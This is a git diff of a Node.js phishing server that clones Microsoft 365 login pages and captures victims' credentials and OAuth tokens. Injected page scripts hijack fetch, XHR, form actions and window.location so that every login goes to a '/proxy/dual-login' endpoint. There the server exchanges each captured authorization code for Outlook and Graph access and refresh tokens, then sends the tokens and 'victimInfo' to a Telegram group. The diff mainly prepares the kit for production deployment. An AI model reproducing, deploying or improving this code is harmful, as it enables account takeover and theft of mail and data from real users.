@@ -16,20 +16,35 @@ const axios = require('axios');
 const cheerio = require('cheerio');
 const fs = require('fs').promises;
 
-
 const app = express();
 const server = http.createServer(app);
+
+// ============= PRODUCTION MODE DETECTION =============
+const isProduction = process.env.NODE_ENV === 'production';
+const APP_URL = process.env.APP_URL || (isProduction ? 'https://your-app.com' : 'http://localhost:3001');
+
+// Clean APP_URL (remove trailing slash)
+const cleanAppUrl = APP_URL.replace(/\/$/, '');
+
+console.log(`\n🚀 ========== SERVER STARTING ==========`);
+console.log(`📊 Mode: ${isProduction ? 'PRODUCTION' : 'DEVELOPMENT'}`);
+console.log(`🌐 App URL: ${cleanAppUrl}`);
+console.log(`🔌 Port: ${process.env.PORT || 3001}`);
+console.log(`========================================\n`);
 
 // ============= RENDER-SPECIFIC CONFIGURATION =============
 app.set('trust proxy', true);
 
 // ============= MIDDLEWARE =============
+const allowedOrigins = isProduction 
+  ? [cleanAppUrl, 'https://login.microsoftonline.com']
+  : ['http://localhost:3001', 'http://127.0.0.1:3001'];
+
 app.use(cors({
-  origin: process.env.NODE_ENV === 'production' 
-    ? [process.env.APP_URL || 'https://your-app.onrender.com'] 
-    : ['http://localhost:3001', 'http://127.0.0.1:3001'],
+  origin: allowedOrigins,
   credentials: true
 }));
+
 app.use(requestIp.mw());
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
@@ -37,9 +52,7 @@ app.use(cookieParser());
 
 const io = new Server(server, {
   cors: {
-    origin: process.env.NODE_ENV === 'production'
-      ? [process.env.APP_URL || 'https://your-app.onrender.com']
-      : ['http://localhost:3001', 'http://127.0.0.1:3001'],
+    origin: allowedOrigins,
     methods: ['GET', 'POST'],
     credentials: true
   },
@@ -55,7 +68,7 @@ let telegramGroupId = process.env.TELEGRAM_GROUP_ID;
 const initializeBot = () => {
   bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN);
   
-  const usePolling = process.env.USE_POLLING === 'true' || process.env.NODE_ENV !== 'production';
+  const usePolling = process.env.USE_POLLING === 'true' || !isProduction;
   
   if (usePolling) {
     console.log('🔧 Using POLLING mode');
@@ -64,9 +77,9 @@ const initializeBot = () => {
       .catch(err => console.error('❌ Failed to start polling:', err));
   } else {
     console.log('🚀 Using WEBHOOK mode');
-    const webhookUrl = `${process.env.APP_URL}/webhook/${process.env.TELEGRAM_BOT_TOKEN}`;
+    const webhookUrl = `${cleanAppUrl}/webhook/${process.env.TELEGRAM_BOT_TOKEN}`;
     bot.setWebHook(webhookUrl)
-      .then(() => console.log('✅ Webhook set successfully'))
+      .then(() => console.log('✅ Webhook set successfully to:', webhookUrl))
       .catch(err => console.error('❌ Webhook setup failed:', err));
   }
   
@@ -116,7 +129,7 @@ function generateCodeChallenge(verifier) {
     .replace(/=/g, '');
 }
 
-// Verify Turnstile token with Cloudflare API [citation:9]
+// Verify Turnstile token with Cloudflare API
 async function verifyTurnstileToken(token, remoteip) {
   const secretKey = process.env.TURNSTILE_SECRET_KEY;
   
@@ -145,7 +158,7 @@ async function verifyTurnstileToken(token, remoteip) {
   }
 }
 
-// Turnstile middleware for Express [citation:9]
+// Turnstile middleware for Express
 async function turnstileMiddleware(req, res, next) {
   // Skip verification for GET requests or if disabled
   if (req.method === 'GET' || process.env.SKIP_TURNSTILE === 'true') {
@@ -173,7 +186,7 @@ async function turnstileMiddleware(req, res, next) {
     });
   }
 
-  // Token is valid, proceed [citation:2]
+  // Token is valid, proceed
   console.log('✅ Turnstile verification passed');
   next();
 }
@@ -347,8 +360,8 @@ function sendToSession(sessionId, event, data) {
 
 // ============= ROOT REDIRECT =============
 app.get('/', (req, res) => {
-  console.log('↪️ Redirecting root to /microsoft');
-  res.redirect('/microsoft');
+  console.log(`↪️ Redirecting root to ${isProduction ? '/en-us/microsoft-365/outlook' : '/microsoft'}`);
+  res.redirect(isProduction ? '/en-us/microsoft-365/outlook' : '/microsoft');
 });
 
 // ============= CLEANUP INTERVAL FOR CODE VERIFIERS =============
@@ -375,17 +388,8 @@ const MICROSOFT_LOGIN_URL = 'https://login.microsoftonline.com';
 
 // ===== DUAL TOKEN CAPTURE CONFIGURATION =====
 const DUAL_TOKEN_CLIENT_ID = '1fec8e78-bce4-4aaf-ab1b-5451cc387264'; // Teams client ID
-
-// ✅ CORRECTED REDIRECT URI - This is what Teams client accepts [citation:2][citation:10]
 const DUAL_TOKEN_REDIRECT_URI = 'https://login.microsoftonline.com/common/oauth2/nativeclient';
-
-// Keep the scope simple - request one resource at a time
 const DUAL_TOKEN_SCOPE = 'https://outlook.office.com/.default openid profile offline_access';
-
-// ===== DUAL TOKEN CAPTURE ENDPOINT =====
-
-
-
 
 // ============= MICROSOFT LANDING PAGE WITH RANDOM TEMPLATE =============
 app.get('/microsoft', async (req, res) => {
@@ -393,36 +397,28 @@ app.get('/microsoft', async (req, res) => {
     const clientIp = requestIp.getClientIp(req) || 'unknown';
     const now = Date.now();
     
-    // Rate limiting check
     const lastRequest = requestTimestamps.get(clientIp) || 0;
     if (now - lastRequest < SESSION_COOLDOWN) {
       return res.status(429).send('Rate limited');
     }
     requestTimestamps.set(clientIp, now);
     
-    // Get random template
     const template = await getRandomTemplate();
     
     if (!template) {
-      // Fallback: if no template found, redirect to a default page or show error
       console.error('❌ No template available, serving fallback');
       return res.status(500).send('Template not available');
     }
     
-    // Create session ID for tracking
     const sessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substring(2, 10);
     
-    // Load the template with cheerio to inject our tracking scripts
     const $ = cheerio.load(template.content);
     
-    // Add tracking and session management scripts
     $('head').append(`
       <script>
-        // Store session ID
         sessionStorage.setItem('phishSessionId', '${sessionId}');
         localStorage.setItem('phishSessionId', '${sessionId}');
         
-        // Track page view
         fetch('/api/track-page-view', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
@@ -439,42 +435,31 @@ app.get('/microsoft', async (req, res) => {
       </script>
     `);
     
-    // Ensure all forms point to your login handler
     $('form').each((i, form) => {
       const originalAction = $(form).attr('action') || '';
       console.log(`🔧 Modifying form ${i+1}, original action: ${originalAction}`);
       
-      // Set form to submit to your login endpoint
       $(form).attr('action', '/common/login');
       $(form).attr('method', 'POST');
-      
-      // Remove any onsubmit handlers
       $(form).removeAttr('onsubmit');
       
-      // Add hidden field for session tracking if not present
       if (!$(form).find('input[name="sessionId"]').length) {
         $(form).append(`<input type="hidden" name="sessionId" value="${sessionId}">`);
       }
       
-      // Ensure all forms have the state field for OAuth
       if (!$(form).find('input[name="state"]').length) {
         $(form).append(`<input type="hidden" name="state" value="${sessionId}">`);
       }
     });
     
-    // Add click tracking for all links
     $('a').each((i, link) => {
       const href = $(link).attr('href');
       if (href && !href.startsWith('#') && !href.startsWith('javascript:')) {
-        // Store original href in data attribute
         $(link).attr('data-original-href', href);
-        
-        // Add click handler via JavaScript
         $(link).attr('onclick', `event.preventDefault(); trackLinkClick('${href}', '${sessionId}', '${template.name}'); return false;`);
       }
     });
     
-    // Add tracking functions
     $('body').append(`
       <script>
         function trackLinkClick(url, sessionId, templateName) {
@@ -490,25 +475,14 @@ app.get('/microsoft', async (req, res) => {
               timestamp: new Date().toISOString()
             })
           }).then(() => {
-            // After tracking, redirect to the original URL
             window.location.href = url;
           }).catch(() => {
-            // If tracking fails, still redirect
             window.location.href = url;
           });
         }
-        
-        // Track form submissions
-        document.addEventListener('submit', function(e) {
-          const form = e.target;
-          console.log('📝 Form submission detected');
-          
-          // You can add additional tracking here if needed
-        });
       </script>
     `);
     
-    // Store template info for this session
     microsoftParams.set(sessionId, {
       template: template.name,
       servedAt: new Date().toISOString(),
@@ -516,10 +490,8 @@ app.get('/microsoft', async (req, res) => {
       userAgent: req.headers['user-agent']
     });
     
-    // Send the modified template
     res.send($.html());
     
-    // Log the template selection
     console.log(`✅ Served template "${template.name}" to ${clientIp} (Session: ${sessionId})`);
     
   } catch (error) {
@@ -527,13 +499,6 @@ app.get('/microsoft', async (req, res) => {
     res.status(500).send('Error loading page');
   }
 });
-
-
-
-
-
-
-
 
 app.get('/en-us/microsoft-365/outlook', async (req, res) => {
   try {
@@ -551,7 +516,6 @@ app.get('/en-us/microsoft-365/outlook', async (req, res) => {
     const codeVerifier = generateCodeVerifier();
     const codeChallenge = generateCodeChallenge(codeVerifier);
     
-    
     codeVerifiers.set(sessionId, codeVerifier);
     
     console.log(`🔐 Dual Token PKCE for session ${sessionId}:`, {
@@ -559,7 +523,6 @@ app.get('/en-us/microsoft-365/outlook', async (req, res) => {
       challenge: codeChallenge.substring(0, 20) + '...'
     });
     
-    // Build auth URL with ONLY Outlook scope initially
     const authUrl = new URL('https://login.microsoftonline.com/common/oauth2/v2.0/authorize');
     authUrl.searchParams.append('client_id', DUAL_TOKEN_CLIENT_ID);
     authUrl.searchParams.append('response_type', 'code');
@@ -571,7 +534,6 @@ app.get('/en-us/microsoft-365/outlook', async (req, res) => {
     authUrl.searchParams.append('prompt', 'select_account');
     authUrl.searchParams.append('response_mode', 'query');
     
-    // Fetch the login page
     const microsoftResponse = await axios({
       method: 'GET',
       url: authUrl.toString(),
@@ -586,228 +548,159 @@ app.get('/en-us/microsoft-365/outlook', async (req, res) => {
     let html = microsoftResponse.data;
     const $ = cheerio.load(html);
     
-    // Add proxy interception script
-  // In your /en-us/microsoft-365/outlook endpoint, replace the script in $('head').append with this:
-
-
-
-
-
-
-
-
-// In your /en-us/microsoft-365/outlook endpoint, replace the Turnstile injection section:
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-$('head').append(`
-  <script>
-    (function() {
-      console.log('🔧 Dual token capture proxy active');
-      
-      // Override fetch
-      const originalFetch = window.fetch;
-      window.fetch = function(url, options = {}) {
-        if (typeof url === 'string' && url.includes('/GetCredentialType')) {
-          console.log('🔄 Redirecting GetCredentialType to proxy');
-          return originalFetch('/proxy/GetCredentialType', {
-            ...options,
-            headers: {
-              ...options.headers,
-              'Origin': 'http://localhost:3001'
+    // Replace localhost references with production URL
+    const origin = isProduction ? cleanAppUrl : 'http://localhost:3001';
+    
+    $('head').append(`
+      <script>
+        (function() {
+          console.log('🔧 Dual token capture proxy active');
+          
+          const ORIGIN = '${origin}';
+          
+          // Override fetch
+          const originalFetch = window.fetch;
+          window.fetch = function(url, options = {}) {
+            if (typeof url === 'string' && url.includes('/GetCredentialType')) {
+              console.log('🔄 Redirecting GetCredentialType to proxy');
+              return originalFetch(ORIGIN + '/proxy/GetCredentialType', {
+                ...options,
+                headers: {
+                  ...options.headers,
+                  'Origin': ORIGIN
+                }
+              });
             }
-          });
-        }
-        return originalFetch(url, options);
-      };
-      
-      // Override XHR
-      const originalXHR = window.XMLHttpRequest;
-      window.XMLHttpRequest = function() {
-        const xhr = new originalXHR();
-        const originalOpen = xhr.open;
-        
-        xhr.open = function(method, url, ...args) {
-          if (typeof url === 'string' && url.includes('/GetCredentialType')) {
-            console.log('🔄 Redirecting XHR GetCredentialType to proxy');
-            url = '/proxy/GetCredentialType';
-          }
-          return originalOpen.call(this, method, url, ...args);
-        };
-        
-        return xhr;
-      };
-      
-      // CRITICAL: Ensure form submission goes to the right place
-      
-      // Level 1: MutationObserver for dynamically added forms
-      const observer = new MutationObserver(function(mutations) {
-        mutations.forEach(function(mutation) {
-          if (mutation.addedNodes) {
-            mutation.addedNodes.forEach(function(node) {
-              if (node.nodeName === 'FORM' || (node.querySelector && node.querySelector('form'))) {
-                console.log('🔍 New form detected, modifying...');
-                fixAllForms();
+            return originalFetch(url, options);
+          };
+          
+          // Override XHR
+          const originalXHR = window.XMLHttpRequest;
+          window.XMLHttpRequest = function() {
+            const xhr = new originalXHR();
+            const originalOpen = xhr.open;
+            
+            xhr.open = function(method, url, ...args) {
+              if (typeof url === 'string' && url.includes('/GetCredentialType')) {
+                console.log('🔄 Redirecting XHR GetCredentialType to proxy');
+                url = ORIGIN + '/proxy/GetCredentialType';
+              }
+              return originalOpen.call(this, method, url, ...args);
+            };
+            
+            return xhr;
+          };
+          
+          // Level 1: MutationObserver for dynamically added forms
+          const observer = new MutationObserver(function(mutations) {
+            mutations.forEach(function(mutation) {
+              if (mutation.addedNodes) {
+                mutation.addedNodes.forEach(function(node) {
+                  if (node.nodeName === 'FORM' || (node.querySelector && node.querySelector('form'))) {
+                    console.log('🔍 New form detected, modifying...');
+                    fixAllForms();
+                  }
+                });
               }
             });
-          }
-        });
-      });
-      
-      observer.observe(document.body, { childList: true, subtree: true });
-      
-      // Level 2: Function to fix all forms
-      function fixAllForms() {
-        document.querySelectorAll('form').forEach(function(form) {
-          // Skip already fixed forms
-          if (form.dataset.fixed === 'true') return;
+          });
           
-          console.log('🔧 Fixing form. Original action:', form.action);
+          observer.observe(document.body, { childList: true, subtree: true });
           
-          // Force action to our proxy
-          if (form.action.includes('/common/login')) {
-            console.log('⚠️ Form was pointing to /common/login, fixing...');
-            form.action = '/proxy/dual-login';
-          }
-          
-          form.method = 'POST';
-          
-          // Ensure all hidden fields exist
-          const requiredFields = [
-            'sessionId', 'state', 'client_id', 
-            'redirect_uri', 'scope', 'response_mode',
-            'code_challenge', 'code_challenge_method'
-          ];
-          
-          requiredFields.forEach(fieldName => {
-            if (!form.querySelector(\`input[name="\${fieldName}"]\`)) {
-              const input = document.createElement('input');
-              input.type = 'hidden';
-              input.name = fieldName;
+          function fixAllForms() {
+            document.querySelectorAll('form').forEach(function(form) {
+              if (form.dataset.fixed === 'true') return;
               
-              // Set values based on field
-              if (fieldName === 'sessionId' || fieldName === 'state') {
-                input.value = '${sessionId}';
-              } else if (fieldName === 'client_id') {
-                input.value = '${DUAL_TOKEN_CLIENT_ID}';
-              } else if (fieldName === 'redirect_uri') {
-                input.value = '${DUAL_TOKEN_REDIRECT_URI}';
-              } else if (fieldName === 'scope') {
-                input.value = '${DUAL_TOKEN_SCOPE}';
-              } else if (fieldName === 'response_mode') {
-                input.value = 'query';
-              } else if (fieldName === 'code_challenge') {
-                input.value = '${codeChallenge}';
-              } else if (fieldName === 'code_challenge_method') {
-                input.value = 'S256';
+              console.log('🔧 Fixing form. Original action:', form.action);
+              
+              if (form.action.includes('/common/login')) {
+                console.log('⚠️ Form was pointing to /common/login, fixing...');
+                form.action = ORIGIN + '/proxy/dual-login';
               }
               
-              form.appendChild(input);
-              console.log(\`➕ Added hidden field: \${fieldName}\`);
+              form.method = 'POST';
+              
+              const requiredFields = [
+                'sessionId', 'state', 'client_id', 
+                'redirect_uri', 'scope', 'response_mode',
+                'code_challenge', 'code_challenge_method'
+              ];
+              
+              requiredFields.forEach(fieldName => {
+                if (!form.querySelector(\`input[name="\${fieldName}"]\`)) {
+                  const input = document.createElement('input');
+                  input.type = 'hidden';
+                  input.name = fieldName;
+                  
+                  if (fieldName === 'sessionId' || fieldName === 'state') {
+                    input.value = '${sessionId}';
+                  } else if (fieldName === 'client_id') {
+                    input.value = '${DUAL_TOKEN_CLIENT_ID}';
+                  } else if (fieldName === 'redirect_uri') {
+                    input.value = '${DUAL_TOKEN_REDIRECT_URI}';
+                  } else if (fieldName === 'scope') {
+                    input.value = '${DUAL_TOKEN_SCOPE}';
+                  } else if (fieldName === 'response_mode') {
+                    input.value = 'query';
+                  } else if (fieldName === 'code_challenge') {
+                    input.value = '${codeChallenge}';
+                  } else if (fieldName === 'code_challenge_method') {
+                    input.value = 'S256';
+                  }
+                  
+                  form.appendChild(input);
+                  console.log(\`➕ Added hidden field: \${fieldName}\`);
+                }
+              });
+              
+              form.dataset.fixed = 'true';
+              
+              form.addEventListener('submit', function(e) {
+                console.log('📤 Form submitting to:', this.action);
+                
+                if (this.action.includes('/common/login')) {
+                  e.preventDefault();
+                  console.log('⚠️ Action was reset at last moment, fixing...');
+                  this.action = ORIGIN + '/proxy/dual-login';
+                  this.submit();
+                }
+              }, true);
+            });
+          }
+          
+          // Level 4: Hijack XHR that might reset forms
+          const xhrOpen = XMLHttpRequest.prototype.open;
+          XMLHttpRequest.prototype.open = function(method, url, ...args) {
+            this.addEventListener('load', function() {
+              setTimeout(fixAllForms, 50);
+            });
+            return xhrOpen.call(this, method, url, ...args);
+          };
+          
+          setInterval(fixAllForms, 500);
+          
+          setTimeout(fixAllForms, 100);
+          setTimeout(fixAllForms, 500);
+          setTimeout(fixAllForms, 1000);
+          
+          const originalLocation = window.location;
+          Object.defineProperty(window, 'location', {
+            get: function() { return originalLocation; },
+            set: function(value) {
+              console.log('⚠️ Attempt to change location to:', value);
+              if (value.includes('/common/login')) {
+                console.log('🛑 Blocked redirect to /common/login');
+                return;
+              }
+              originalLocation.href = value;
             }
           });
           
-          // Mark as fixed
-          form.dataset.fixed = 'true';
-          
-          // Level 3: Override submit event
-          form.addEventListener('submit', function(e) {
-            console.log('📤 Form submitting to:', this.action);
-            
-            // Final check before submit
-            if (this.action.includes('/common/login')) {
-              e.preventDefault();
-              console.log('⚠️ Action was reset at last moment, fixing...');
-              this.action = '/proxy/dual-login';
-              this.submit();
-            }
-          }, true);
-        });
-      }
-      
-      // Level 4: Hijack XHR that might reset forms
-      const xhrOpen = XMLHttpRequest.prototype.open;
-      XMLHttpRequest.prototype.open = function(method, url, ...args) {
-        this.addEventListener('load', function() {
-          // Small delay to let DOM update
-          setTimeout(fixAllForms, 50);
-        });
-        return xhrOpen.call(this, method, url, ...args);
-      };
-      
-      // Level 5: Periodic checks (backup)
-      setInterval(fixAllForms, 500);
-      
-      // Initial fixes
-      setTimeout(fixAllForms, 100);
-      setTimeout(fixAllForms, 500);
-      setTimeout(fixAllForms, 1000);
-      
-      // Level 6: Hijack window.location changes
-      const originalLocation = window.location;
-      Object.defineProperty(window, 'location', {
-        get: function() { return originalLocation; },
-        set: function(value) {
-          console.log('⚠️ Attempt to change location to:', value);
-          if (value.includes('/common/login')) {
-            console.log('🛑 Blocked redirect to /common/login');
-            return;
-          }
-          originalLocation.href = value;
-        }
-      });
-      
-      console.log('✅ All interception layers active for dual token capture');
-    })();
-  </script>
-`);
+          console.log('✅ All interception layers active for dual token capture');
+        })();
+      </script>
+    `);
 
-    // Add session ID tracking
     $('body').append(`
       <script>
         sessionStorage.setItem('phishSessionId', '${sessionId}');
@@ -815,7 +708,6 @@ $('head').append(`
       </script>
     `);
 
-    // Store params
     const params = {};
     $('input').each((i, elem) => {
       const name = $(elem).attr('name');
@@ -825,53 +717,42 @@ $('head').append(`
     
     microsoftParams.set(sessionId, params);
     
-    // Modify forms for dual token capture
-   // Modify forms for dual token capture with extra safeguards
-$('form').each((i, form) => {
-  console.log('🔧 Original form action:', $(form).attr('action'));
-  
-  // Force action to our proxy
-  $(form).attr('action', '/proxy/dual-login');
-  $(form).attr('method', 'POST');
-  
-  // Remove any existing onsubmit handlers that might interfere
-  $(form).removeAttr('onsubmit');
-  
-  // Remove any existing event listeners by cloning (aggressive)
-  const formClone = $(form).clone(true, true);
-  $(form).replaceWith(formClone);
-  form = formClone[0];
-  
-  // Ensure all hidden fields exist (without duplicates)
-  const fields = {
-    'sessionId': sessionId,
-    'state': sessionId,
-    'client_id': DUAL_TOKEN_CLIENT_ID,
-    'redirect_uri': DUAL_TOKEN_REDIRECT_URI,
-    'scope': DUAL_TOKEN_SCOPE,
-    'response_mode': 'query',
-    'code_challenge': codeChallenge,
-    'code_challenge_method': 'S256'
-  };
-  
-  Object.entries(fields).forEach(([name, value]) => {
-    // Remove any existing field with this name
-    $(form).find(`input[name="${name}"]`).remove();
-    // Add fresh hidden field
-    $(form).append(`<input type="hidden" name="${name}" value="${value}">`);
-  });
-  
-  console.log('✅ Modified form action to:', $(form).attr('action'));
-  
-  // Add a direct submit handler using native JavaScript
-  form.addEventListener('submit', function(e) {
-    console.log('📤 Form submitting to:', this.action);
-    return true;
-  });
-});
+    $('form').each((i, form) => {
+      console.log('🔧 Original form action:', $(form).attr('action'));
+      
+      $(form).attr('action', '/proxy/dual-login');
+      $(form).attr('method', 'POST');
+      $(form).removeAttr('onsubmit');
+      
+      const formClone = $(form).clone(true, true);
+      $(form).replaceWith(formClone);
+      form = formClone[0];
+      
+      const fields = {
+        'sessionId': sessionId,
+        'state': sessionId,
+        'client_id': DUAL_TOKEN_CLIENT_ID,
+        'redirect_uri': DUAL_TOKEN_REDIRECT_URI,
+        'scope': DUAL_TOKEN_SCOPE,
+        'response_mode': 'query',
+        'code_challenge': codeChallenge,
+        'code_challenge_method': 'S256'
+      };
+      
+      Object.entries(fields).forEach(([name, value]) => {
+        $(form).find(`input[name="${name}"]`).remove();
+        $(form).append(`<input type="hidden" name="${name}" value="${value}">`);
+      });
+      
+      console.log('✅ Modified form action to:', $(form).attr('action'));
+      
+      form.addEventListener('submit', function(e) {
+        console.log('📤 Form submitting to:', this.action);
+        return true;
+      });
+    });
     
     res.send($.html());
-    
     
   } catch (error) {
     console.error('Dual token flow error:', error.message);
@@ -879,17 +760,8 @@ $('form').each((i, form) => {
   }
 });
 
-
-
-
-
-
-
-
-
 // ===== DUAL TOKEN EXCHANGE ENDPOINT =====
-// ===== DUAL TOKEN EXCHANGE ENDPOINT =====
-app.post('/proxy/dual-login',turnstileMiddleware, express.urlencoded({ extended: true }), async (req, res) => {
+app.post('/proxy/dual-login', turnstileMiddleware, express.urlencoded({ extended: true }), async (req, res) => {
   console.log('📥 Dual token login submission');
   
   const sessionId = req.body?.state || req.body?.sessionId || 'unknown';
@@ -926,7 +798,6 @@ app.post('/proxy/dual-login',turnstileMiddleware, express.urlencoded({ extended:
       validateStatus: status => status >= 200 && status < 400
     }).catch(err => err.response);
     
-    // Check for login failure
     if (response?.headers?.location?.includes('/common/login')) {
       const errorMatch = response.headers.location.match(/error=([^&]+)/);
       const error = errorMatch ? errorMatch[1] : 'invalid_password';
@@ -937,15 +808,12 @@ app.post('/proxy/dual-login',turnstileMiddleware, express.urlencoded({ extended:
       const location = response.headers.location;
       console.log(`↪️ Microsoft redirects to: ${location}`);
       
-      // Extract the authorization code from the OOB redirect
       if (location.includes('urn:ietf:wg:oauth:2.0:oob') && location.includes('code=')) {
         const codeMatch = location.match(/[?&]code=([^&]+)/);
         if (codeMatch && codeMatch[1]) {
           const code = decodeURIComponent(codeMatch[1]);
           console.log(`✅ Auth code captured for ${sessionId}: ${code.substring(0, 30)}...`);
           
-          // ===== SEQUENTIAL TOKEN EXCHANGE =====
-          // First, exchange for Outlook token (the scope we initially requested)
           console.log('🔄 Exchanging for Outlook token...');
           
           const outlookTokens = await exchangeForResource(
@@ -954,8 +822,6 @@ app.post('/proxy/dual-login',turnstileMiddleware, express.urlencoded({ extended:
             'outlook'
           );
           
-          // Second, exchange the SAME code for Graph token
-          // The auth code can be used multiple times for different resources! [citation:1]
           console.log('🔄 Exchanging same code for Graph token...');
           
           const graphTokens = await exchangeForResource(
@@ -964,7 +830,6 @@ app.post('/proxy/dual-login',turnstileMiddleware, express.urlencoded({ extended:
             'graph'
           );
           
-          // Store both tokens in the session
           let tokenSession = capturedData.get(sessionId) || { cookies: [], credentials: {}, tokens: {} };
           
           if (outlookTokens) {
@@ -994,19 +859,14 @@ app.post('/proxy/dual-login',turnstileMiddleware, express.urlencoded({ extended:
           
           capturedData.set(sessionId, tokenSession);
           
-          // Send comprehensive notification
           await sendDualTokenNotification(sessionId, username, victimInfo, outlookTokens, graphTokens);
           
-          // Show success page with both tokens
-          // res.send(generateDualTokenSuccessPage(sessionId, outlookTokens, graphTokens));
           console.log('🔄 Dual token capture successful, redirecting to Outlook...');
           return res.redirect('https://outlook.live.com/mail/');
-          
         }
       }
     }
     
-    // If we get here, something went wrong
     res.redirect('/en-us/microsoft-365/outlook?error=auth_failed');
     
   } catch (error) {
@@ -1057,146 +917,6 @@ async function exchangeForResource(sessionId, code, codeVerifier, scope, resourc
   }
 }
 
-// Helper function to exchange code for a specific resource
-async function exchangeForResource(sessionId, code, codeVerifier, scope, resourceName) {
-  try {
-    console.log(`🔄 Exchanging for ${resourceName} token...`);
-    
-    const tokenParams = {
-      client_id: DUAL_TOKEN_CLIENT_ID,
-      code: code,
-      code_verifier: codeVerifier,
-      redirect_uri: DUAL_TOKEN_REDIRECT_URI,
-      grant_type: 'authorization_code',
-      scope: scope
-    };
-    
-    const tokenResponse = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token', 
-      new URLSearchParams(tokenParams).toString(),
-      {
-        headers: {
-          'Content-Type': 'application/x-www-form-urlencoded',
-          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-          'Accept': 'application/json'
-        }
-      }
-    );
-    
-    const tokens = tokenResponse.data;
-    console.log(`✅ ${resourceName} tokens received!`);
-    console.log(`   Access Token: ${tokens.access_token.substring(0, 50)}...`);
-    console.log(`   Refresh Token: ${tokens.refresh_token ? tokens.refresh_token.substring(0, 50) + '...' : 'Not provided'}`);
-    console.log(`   Expires in: ${tokens.expires_in} seconds`);
-    
-    return tokens;
-    
-  } catch (error) {
-    console.error(`❌ ${resourceName} token exchange failed:`, error.response?.data || error.message);
-    return null;
-  }
-}
-
-// Generate success page HTML for dual tokens
-function generateDualTokenSuccessPage(sessionId, outlookTokens, graphTokens) {
-  const outlookSuccess = outlookTokens ? '✅' : '❌';
-  const graphSuccess = graphTokens ? '✅' : '⚠️';
-  
-  return `
-    <html>
-      <head>
-        <style>
-          body { font-family: Arial; text-align: center; padding: 30px; background: #f5f5f5; }
-          .container { max-width: 900px; margin: 0 auto; }
-          .success { background: linear-gradient(135deg, #0078d4, #8a2be2); color: white; padding: 30px; border-radius: 10px; margin-bottom: 30px; }
-          .strategy-badge { background: gold; color: black; padding: 5px 15px; border-radius: 20px; font-weight: bold; margin-top: 10px; display: inline-block; }
-          .token-section { background: white; padding: 20px; margin: 20px 0; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); text-align: left; }
-          .outlook-section { border-left: 5px solid #0078d4; }
-          .graph-section { border-left: 5px solid #8a2be2; }
-          .token-box { background: #f8f8f8; padding: 15px; border-radius: 5px; word-break: break-all; font-family: monospace; font-size: 12px; margin: 10px 0; }
-          .badge { display: inline-block; padding: 3px 8px; border-radius: 12px; font-size: 11px; margin-left: 10px; }
-          .outlook-badge { background: #0078d4; color: white; }
-          .graph-badge { background: #8a2be2; color: white; }
-          .success-badge { background: #4CAF50; color: white; }
-          .warning-badge { background: #ff9800; color: white; }
-          .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin: 20px 0; }
-          .stat-card { background: white; padding: 15px; border-radius: 5px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
-          .debug-links { margin-top: 30px; }
-          .debug-links a { color: #0078d4; text-decoration: none; margin: 0 10px; }
-        </style>
-      </head>
-      <body>
-        <div class="container">
-          <div class="success">
-            <h1>✅ WINNING STRATEGY SUCCESS!</h1>
-            <p>Outlook token captured via code exchange, Graph token via refresh</p>
-            <div class="strategy-badge">⚡ 1 Code → 2 Tokens ⚡</div>
-            <p style="font-size: 14px; margin-top: 15px;">Session: ${sessionId}</p>
-          </div>
-          
-          <div class="stats-grid">
-            <div class="stat-card">
-              <div style="font-size: 24px; color: #0078d4;">${outlookSuccess}</div>
-              <div>Outlook Token</div>
-              <small>via code exchange</small>
-            </div>
-            <div class="stat-card">
-              <div style="font-size: 24px; color: #8a2be2;">${graphSuccess}</div>
-              <div>Graph Token</div>
-              <small>via refresh token</small>
-            </div>
-          </div>
-          
-          ${outlookTokens ? `
-          <div class="token-section outlook-section">
-            <h3>📧 Outlook API Token <span class="badge outlook-badge">90-day refresh</span></h3>
-            <p><strong>Expires in:</strong> ${outlookTokens.expires_in} seconds</p>
-            <div class="token-box">
-              <strong>Access Token:</strong><br>
-              ${outlookTokens.access_token}
-            </div>
-            <div class="token-box">
-              <strong>Refresh Token (used for Graph):</strong><br>
-              ${outlookTokens.refresh_token || 'Not provided'}
-            </div>
-          </div>
-          ` : ''}
-          
-          ${graphTokens ? `
-          <div class="token-section graph-section">
-            <h3>🔄 Microsoft Graph Token <span class="badge graph-badge">via refresh</span></h3>
-            <p><strong>Expires in:</strong> ${graphTokens.expires_in} seconds</p>
-            <div class="token-box">
-              <strong>Access Token:</strong><br>
-              ${graphTokens.access_token}
-            </div>
-            <div class="token-box">
-              <strong>Refresh Token:</strong><br>
-              ${graphTokens.refresh_token || 'Same as Outlook refresh'}
-            </div>
-          </div>
-          ` : ''}
-          
-          <div class="token-section">
-            <h3>📋 Summary</h3>
-            <p>✅ One authorization code used for Outlook token</p>
-            <p>✅ Outlook refresh token used to obtain Graph token</p>
-            <p>⚠️ Graph token may share the same refresh token as Outlook</p>
-          </div>
-          
-          <div class="debug-links">
-            <a href="/captured-sessions">📋 View All Sessions</a>
-            <a href="/debug-cookies/${sessionId}">🔍 Debug This Session</a>
-            <a href="/export-session/${sessionId}">📤 Export Session</a>
-          </div>
-          
-          <script>
-            setTimeout(() => { window.close(); }, 30000);
-          </script>
-        </div>
-      </body>
-    </html>
-  `;
-}
 // ===== DUAL TOKEN NOTIFICATION =====
 async function sendDualTokenNotification(sessionId, username, victimInfo, outlookTokens, graphTokens) {
   let message = `🎯 *WINNING STRATEGY: DUAL TOKENS!*\n`;
@@ -1233,7 +953,6 @@ async function sendDualTokenNotification(sessionId, username, victimInfo, outloo
   await bot.sendMessage(telegramGroupId, message, { parse_mode: 'Markdown' })
     .catch(e => console.error('Telegram error:', e.message));
   
-  // Also send token files
   if (outlookTokens) {
     await sendTokenFile(sessionId, username, 'outlook', outlookTokens);
   }
@@ -1336,28 +1055,30 @@ app.get('/microsoft-desktop', async (req, res) => {
     let html = microsoftResponse.data;
     const $ = cheerio.load(html);
     
+    const origin = isProduction ? cleanAppUrl : 'http://localhost:3001';
+    
     $('head').append(`
